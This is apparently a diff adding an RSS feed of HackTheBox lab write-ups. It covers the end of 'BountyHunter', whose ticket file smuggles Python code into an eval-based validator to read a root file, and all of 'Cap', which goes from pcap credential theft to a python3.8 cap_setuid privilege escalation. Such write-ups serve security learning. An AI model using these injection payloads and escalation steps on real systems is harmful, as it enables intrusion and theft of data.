+&lt;li&gt;returns &lt;code&gt;False&lt;/code&gt; whether the first line doesn&amp;rsquo;t start with &lt;code&gt;# Skytrain Inc&lt;/code&gt; or &lt;code&gt;## Ticket to&lt;/code&gt;; otherwise, prints the destination and continues.&lt;/li&gt;
+&lt;li&gt;reads the string below &amp;ldquo;__Ticket Code:__&amp;rdquo;, removes (**) and thereafter assigns the number before the (+) operator as&lt;code&gt;ticketCode&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Executes the following string as code whether the modulo of &lt;code&gt;ticketCode&lt;/code&gt; and 7 is 4.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Hence, our &lt;code&gt;root_ticket.md&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Skytrain Inc
+&lt;span style=&#34;color:#75715e&#34;&gt;## Ticket to New Haven&lt;/span&gt;
+__Ticket Code:__
+**32+100 and __import__&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat /root/root.txt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;##Issued: 2021/10/03&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#End Ticket&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_17-13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HackTheBox: Cap</title>
+      <link>/posts/htb-cap/</link>
+      <pubDate>Fri, 01 Oct 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/htb-cap/</guid>
+      <description>Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are here solving Cap - another HackTheBox easy machine.
+So yeah, hope you enjoy.
+Enumeration As usual, we wanted to start our enumeration step with nmap.
+┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/Cap] └─$ cat nmap/Cap.nmap # Nmap 7.91 scan initiated Thu Sep 30 21:54:00 2021 as: nmap -sS -sV -sC -p- -oA nmap/Cap 10.</description>
+      <content>&lt;p&gt;Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are here solving Cap - another HackTheBox easy machine.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;So yeah, hope you enjoy.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;As usual, we wanted to start our enumeration step with &lt;a href=&#34;https://nmap.org/&#34;&gt;nmap&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Cap&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cat nmap/Cap.nmap
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Thu Sep 30 21:54:00 2021 as: nmap -sS -sV -sC -p- -oA nmap/Cap 10.10.10.245&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.245
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.054s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+	...
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Thu Sep 30 21:56:34 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds&lt;/span&gt;
+                                   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output was simplified as we just needed to focus on those SSH, FTP and HTTP service ports. I also tried enumerating them with CrackMapExec but nothing was found since neither their SSH nor FTP was any low-hanging fruit at all.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;from-pcap-to-user-access&#34;&gt;From PCAP to user access&lt;/h3&gt;
+&lt;p&gt;Visiting the webpage gave us a small hint about the username.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001113218536.png&#34; alt=&#34;image-20211001113218536&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The top-left dropdown provided us with three features and only the second, &lt;em&gt;Security Snapshot Analysis&lt;/em&gt;, that I considered abusable whereas the other two were just outputs from &lt;code&gt;ifconfig&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001113725814.png&#34; alt=&#34;image-20211001113725814&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The second option redirected the user to an endpoint of downloadable Wireshark data separated by IDs: &lt;code&gt;http://10.10.10.245/data/[ID]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001114211478.png&#34; alt=&#34;image-20211001114211478&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With this type of situation, let&amp;rsquo;s have &lt;a href=&#34;https://tools.kali.org/web-applications/dirb&#34;&gt;dirb&lt;/a&gt; doing its job.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ dirb http://10.10.10.245/data/ /usr/share/wordlists/dirb/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we got expected result:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001115207758.png&#34; alt=&#34;image-20211001115207758&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Except &lt;code&gt;0.pcap&lt;/code&gt; from &lt;code&gt;http://10.10.10.245/data/0&lt;/code&gt; or &lt;code&gt;00&lt;/code&gt;, all data of other IDs seemed to be empty.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001121045966.png&#34; alt=&#34;image-20211001121045966&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After downloading, we could inspect the .PCAP file with &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Cap&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ wireshark 0.pcap&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scrolled down a little around FTP protocol then you would be able to grab our user&amp;rsquo;s credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_12-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With the newly found username and password, let&amp;rsquo;s try logging in to the remote target via SSH and FTP.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_12-43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Same credentials also worked for SSH.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can see that someone else had been here before us and dropped their enumeration script (linpeas.sh) here. Since &lt;code&gt;sudo -l&lt;/code&gt; is not allowed for user &lt;code&gt;nathan&lt;/code&gt;, I also started a LinPEAS instance and streamed it back to my Linux.&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;The script resulted with an infamous &lt;code&gt;python3.8&lt;/code&gt; capability vector.&lt;/p&gt;
+&lt;p&gt;Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On account of the &lt;code&gt;cap_setuid&lt;/code&gt; capability, one can temporarily execute a program/file with dedicated privilege. In our case, I spawned a shell with root id and was then able to read the final flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
